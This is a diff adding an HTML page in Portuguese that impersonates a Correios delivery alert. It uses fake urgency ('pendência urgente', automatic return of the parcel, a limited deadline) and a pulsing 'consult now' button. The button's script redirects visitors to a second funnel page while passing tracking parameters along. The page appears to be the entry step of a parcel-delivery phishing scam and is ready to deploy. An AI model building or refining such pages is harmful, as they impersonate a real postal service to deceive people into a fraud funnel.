@@ -1,0 +1,346 @@
+<!DOCTYPE html><html lang="pt-br"><head>
+    <script src="/funnel-tracking.js"></script>
+    <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Aviso de Entrega - Correios</title>
+    <style>
+      * { box-sizing: border-box; margin: 0; padding: 0; }
+
+      body {
+        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        background-color: #FFC107;
+        min-height: 100vh;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding: 24px 16px;
+      }
+
+      .card {
+        background: #fff;
+        border-radius: 18px;
+        padding: 36px 28px;
+        max-width: 540px;
+        width: 100%;
+        box-shadow: 0 8px 40px rgba(0,0,0,0.18);
+        border-top: 6px solid #e65100;
+        text-align: center;
+      }
+
+      /* LOGO CORREIOS */
+      .logo-area {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 8px;
+        margin-bottom: 20px;
+      }
+
+      .logo-correios {
+        font-size: 13px;
+        font-weight: 800;
+        color: #003DA5;
+        text-transform: uppercase;
+        letter-spacing: 1px;
+        border: 2px solid #003DA5;
+        padding: 4px 12px;
+        border-radius: 4px;
+      }
+
+      /* BADGE */
+      .badge-urgente {
+        display: inline-block;
+        background: #e53935;
+        color: #fff;
+        font-size: 11px;
+        font-weight: 800;
+        letter-spacing: 1.5px;
+        text-transform: uppercase;
+        padding: 5px 16px;
+        border-radius: 20px;
+        margin-bottom: 18px;
+        animation: piscar 1.4s infinite;
+      }
+
+      @keyframes piscar {
+        0%, 100% { opacity: 1; }
+        50% { opacity: 0.55; }
+      }
+
+      /* EMOJI */
+      .emoji {
+        font-size: 56px;
+        display: block;
+        margin-bottom: 12px;
+      }
+
+      /* TÍTULO */
+      h1 {
+        font-size: 20px;
+        color: #1a1200;
+        font-weight: 900;
+        line-height: 1.45;
+        margin-bottom: 6px;
+      }
+
+      h1 em {
+        font-style: normal;
+        color: #e65100;
+        border-bottom: 2px solid #FFC107;
+      }
+
+      .subtitulo {
+        font-size: 14px;
+        color: #777;
+        margin-bottom: 20px;
+      }
+
+      /* ALERTA */
+      .alerta {
+        background: #fffbea;
+        border: 1.5px solid #FFC107;
+        border-left: 5px solid #e65100;
+        border-radius: 10px;
+        padding: 14px 16px;
+        margin-bottom: 22px;
+        text-align: left;
+      }
+
+      .alerta-titulo {
+        font-size: 12px;
+        font-weight: 800;
+        color: #b45309;
+        text-transform: uppercase;
+        letter-spacing: 0.6px;
+        margin-bottom: 6px;
+      }
+
+      .alerta p {
+        font-size: 14px;
+        color: #5a4000;
+        line-height: 1.65;
+      }
+
+      .alerta p strong { color: #c45100; }
+
+      /* DIVISOR */
+      .divider {
+        height: 1.5px;
+        background: #FFC107;
+        border-radius: 2px;
+        margin: 20px 0;
+        opacity: 0.5;
+      }
+
+      /* LISTA */
+      .lista {
+        list-style: none;
+        margin-bottom: 26px;
+        text-align: left;
+      }
+
+      .lista li {
+        font-size: 14px;
+        color: #333;
+        padding: 10px 0;
+        border-bottom: 1px solid #f5f5f5;
+        display: flex;
+        align-items: flex-start;
+        gap: 10px;
+        line-height: 1.5;
+      }
+
+      .lista li:last-child { border-bottom: none; }
+
+      .lista li .icone {
+        font-size: 18px;
+        min-width: 26px;
+        text-align: center;
+        margin-top: 1px;
+      }
+
+      .lista li strong { color: #1a1200; }
+
+      /* BOTÃO */
+      .btn-wrap {
+        position: relative;
+        margin-bottom: 14px;
+      }
+
+      .btn-pulse {
+        position: absolute;
+        inset: 0;
+        border-radius: 12px;
+        background: #2e7d32;
+        animation: pulse 1.8s infinite;
+        z-index: 0;
+      }
+
+      @keyframes pulse {
+        0% { transform: scale(1); opacity: 0.6; }
+        70% { transform: scale(1.07); opacity: 0; }
+        100% { transform: scale(1.07); opacity: 0; }
+      }
+
+      .btn {
+        position: relative;
+        z-index: 1;
+        display: block;
+        width: 100%;
+        padding: 18px;
+        background: linear-gradient(135deg, #2e7d32, #43a047);
+        color: #fff;
+        font-size: 15px;
+        font-weight: 900;
+        border: none;
+        border-radius: 12px;
+        cursor: pointer;
+        letter-spacing: 0.4px;
+        text-transform: uppercase;
+        box-shadow: 0 6px 20px rgba(46,125,50,0.45);
+        transition: transform 0.15s;
+      }
+
+      .btn:hover { transform: translateY(-2px); }
+      .btn:disabled { opacity: 0.75; cursor: not-allowed; }
+
+      /* RODAPÉ INFO */
+      .info-rodape {
+        display: flex;
+        flex-direction: column;
+        gap: 5px;
+        margin-bottom: 4px;
+      }
+
+      .tempo {
+        font-size: 13px;
+        color: #777;
+      }
+
+      .tempo strong { color: #e53935; }
+
+      .seguro {
+        font-size: 12px;
+        color: #aaa;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 4px;
+      }
+
+      /* LOADING */
+      .loading {
+        display: none;
+        margin-top: 14px;
+        font-size: 14px;
+        color: #555;
+        align-items: center;
+        justify-content: center;
+        gap: 10px;
+      }
+
+      .spinner {
+        width: 20px;
+        height: 20px;
+        border: 3px solid #ddd;
+        border-top-color: #FFC107;
+        border-radius: 50%;
+        animation: spin 0.8s linear infinite;
+        flex-shrink: 0;
+      }
+
+      @keyframes spin { to { transform: rotate(360deg); } }
+
+      .footer {
+        margin-top: 20px;
+        font-size: 11px;
+        color: #ccc;
+        border-top: 1px solid #f0f0f0;
+        padding-top: 14px;
+      }
+
+      /* RESPONSIVO */
+      @media (max-width: 480px) {
+        .card { padding: 28px 20px; }
+        h1 { font-size: 18px; }
+        .btn { font-size: 14px; padding: 16px; }
+        .emoji { font-size: 48px; }
+      }
+    </style>
+</head>
+<body>
+  <div class="card">
+
+
+    <div class="badge-urgente">🔴 Ação Necessária</div>
+
+    <span class="emoji">📦</span>
+
+    <h1>Sua encomenda tem uma <em>pendência urgente</em> que pode impedir a entrega</h1>
+    <p class="subtitulo">Verifique agora antes que o prazo expire</p>
+
+    <div class="alerta">
+      <div class="alerta-titulo">⚠️ Aviso do Sistema</div>
+      <p>Identificamos uma <strong>atualização crítica</strong> no status do seu envio. Entregas com pendência não regularizada são <strong>devolvidas automaticamente</strong> ao remetente.</p>
+    </div>
+
+    <div class="divider"></div>
+
+    <ul class="lista">
+      <li>
+        <span class="icone">✅</span>
+        <span><strong>Consulta gratuita</strong> — sem nenhum custo para verificar</span>
+      </li>
+      <li>
+        <span class="icone">⚡</span>
+        <span>Resultado em <strong>menos de 1 minuto</strong></span>
+      </li>
+      <li>
+        <span class="icone">📋</span>
+        <span>Veja o <strong>status atualizado</strong> da sua entrega</span>
+      </li>
+      <li>
+        <span class="icone">⏰</span>
+        <span><strong>Prazo limitado</strong> — após vencer, a entrega é cancelada</span>
+      </li>
+    </ul>
+
+    <div class="btn-wrap">
+      <div class="btn-pulse"></div>
+      <button class="btn" id="btn-consultar">
+        🔍 Consultar Minha Encomenda Agora
+      </button>
+    </div>
+
+    <div class="info-rodape">
+      <p class="tempo">⏰ Leva menos de <strong>1 minuto</strong> — não perca o prazo</p>
+      <p class="seguro">🔒 Consulta 100% segura e gratuita</p>
+    </div>
+
+    <div class="loading" id="loading">
+      <div class="spinner"></div>
+      Acessando sistema de rastreamento...
+    </div>
+
+    <div class="footer">
+      Sistema de Rastreamento de Encomendas  |  Consulta Segura
+    </div>
+
+  </div>
+
+  <script>
+    document.getElementById('btn-consultar').addEventListener('click', function() {
+      this.disabled = true;
+      this.textContent = 'Consultando...';
+      document.querySelector('.btn-pulse').style.display = 'none';
+      document.getElementById('loading').style.display = 'flex';
+
+      setTimeout(() => {
+        window.location.href = '../2/index.html' + window.location.search;
+      }, 1200);
+    });
+  </script>
+
+
+</body></html>
